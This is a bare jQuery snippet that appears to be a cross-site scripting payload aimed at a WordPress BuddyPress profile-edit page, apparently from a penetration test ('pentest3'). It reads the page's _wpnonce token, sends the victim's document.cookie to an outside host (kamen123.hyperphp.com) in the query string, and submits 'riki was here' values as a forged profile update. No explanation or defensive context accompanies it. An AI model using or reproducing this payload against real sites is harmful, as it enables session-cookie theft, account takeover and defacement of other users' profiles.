
    $(document).ready(function(){
        var x = document.getElementById("_wpnonce").value;
        console.log(x);
        $.ajax({
            type: 'POST',

            url: 'http://www.kamen123.hyperphp.com/test.php?wkwk='+document.cookie,
            data: {
                "field_1": "riki washing here",
                "field_12": "riki washing here",
                "field_13": "riki was here",
                "profile-group-edit-submit": "Save Changes +",
                "field_ids": "1,12,13",
                "_wpnonce": x,
                "_wp_http_referer": "/members/pentest3/profile/edit/group/1/"
    },
            success: function (msg) {
                alert('sukses!');

            }
        });
});
